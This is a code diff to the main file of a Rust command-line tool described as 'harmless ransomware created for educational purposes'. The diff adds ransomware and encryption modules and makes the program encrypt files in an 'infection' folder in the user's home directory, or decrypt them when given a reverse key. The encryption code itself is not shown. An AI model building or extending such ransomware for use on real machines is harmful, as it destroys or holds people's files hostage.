@@ -1,10 +1,16 @@
 use clap::{command, value_parser, Arg};
 
+mod ransomware;
+use ransomware::*;
+
+mod encrypt;
+
 fn main() {
     let matches = command!()
         .version("1.0")
         .author("hboissel")
-        .about("Harmless ransomware created for educational purposes.")
+        .about("Harmless ransomware created for educational purposes.
+Encrypts the files in the infection folder in the home directory of the current user.")
         .arg(
             Arg::new("reverse")
                 .short('r')
@@ -26,8 +32,11 @@ fn main() {
         .get_matches();
 
     let reverse_key: &String = matches.get_one::<String>("reverse").unwrap();
-    let silent_mode: &bool = matches.get_one::<bool>("silent").unwrap();
+    let _silent_mode: &bool = matches.get_one::<bool>("silent").unwrap();
 
-    println!("Reverse key: {}", reverse_key);
-    println!("Silent mode: {}", silent_mode);
+    if !reverse_key.is_empty() {
+        ransomware_reverse(&reverse_key);
+    } else {
+        ransomware();
+    }
 }
